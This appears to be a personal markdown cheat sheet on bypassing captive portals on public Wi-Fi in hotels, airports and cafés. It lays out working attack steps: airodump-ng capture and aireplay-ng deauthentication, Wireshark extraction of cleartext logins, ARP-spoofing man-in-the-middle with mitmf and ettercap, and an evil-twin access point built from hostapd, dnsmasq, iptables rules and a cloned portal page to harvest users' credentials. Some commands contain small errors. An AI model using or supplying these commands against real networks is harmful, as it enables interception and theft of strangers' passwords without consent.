- Widely used in hotels, airports, coffee shops
- Allows users to access internet after logging in
- Users log in using a web interface


# How to bypass open captive portals
- Change MAC address to one of the connected devices
- Sniff logins in monitor mode
	- run airodump-ng wlan0 to get the MAC address and channel
	- run airodump-ng --bssid  00:25:F0:77:0D:FC --channel 11 --write test wlan0 
	- deauthenticate a client by running aireplay-ng -0 1 -a 00:25:F0:77:0D:FC -c 11:11:11:11:11:11 wlan0 
	- run wireshark
		- File > Open > test-01.cap
		- filter by “http”
		- Look for a POST request under the “info” column
			- Expand “HTML Form Url Encoded: ...”
			- keep expanding until you fins the user/pass in clear text
- Connect and sniff logins after running an arp spoofing attack
	- Data sent to/fm router including passwords will be directed to us
	- This is a MITM attack
	- We don't need to deauth them since the targets will go through us and since we do not have internet access they will be disconnected
	- mitmf --arp --spoof -i wlan0 --gateway 192.168.2.1 
		- you can get the gateway using “route -n”
		- This will make you the man in the middle
	- ettercap -Tq -M arp:remote -i wlan0 ///
		- another tool to do MITM
		- Tq means run in Text mode quiet
		- /// means we want to target all connected users
	- Both of the tools above will capture the credentials for you and print them to the terminal
- Create a fake AP and ask users to log on
	- Clone the captive portal page
		- Make sure the form is basic html
	- Create fake AP with the same name or similar name 
	- Deauth users from real network so they log into our evil twin
 
# Main components of wifi networks:
- A router broadcasting a signal > use wifi card with hostapd
- A DHCP server to give IPs to clients > use dnsmasq
- A DNS server to handle dns requests > use dnsmasq

# Install dnsmasq and hostapd
- apt-get install dnsmasq
- apt-get install hostapd
# setup:
- Make sure you Alfa card is plusgged in
- systemctl stop NetworkManager.service
- systemctl stop wpa_supplicant.service 
- run the commands below (bash ./flushiptables.sh)
``` sh
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
```

## To run dnsmasq and hostapd:
- dnsmasq -C /root/Downloads/fake-ap/dnsmasq.conf
- hostapd /root/Downloads/fake-ap/hostapd.conf -B
	- -B is so that it executes in the background

## We need to make 10.0.0.1 our default gateway
- route add default gw 10.0.0.1
	- check by running route -n (delete any others on wlan0)

## Now we need to set up ip number on wireless adapter
- ifconfig wlan0 10.0.0.1 netmask 255.255.255.0

## Start your captive portal server
- python app.py

## Try to make you captive portal use https:
- generate an https certificate
	- openssl req -new -x509 - days 365 /root/downloads/cert.pem -keyout /root/downloads/cert.key

## Ways to sniff the user/pass
- tshark -i wlan0 -w test.cap
   - open wireshark, open the test.cap file, look for http/post packets 

## Reset ip tables after you are all done
- iptables -t nat --flush

## if you need to stop dnsmaq
- ss -lp "sport = :domain"
- kill -9 #####

## to stop everything:
``` sh
service hostapd stop
service dnsmasq stop
service apache2 stop
service rpcbind stop
killall dnsmasq
killall hostapd
systemctl start NetworkManager.service
systemctl start wpa_supplicant.service
```

## follow this guys steps
- https://www.youtube.com/watch?v=1LWuZy_ept8

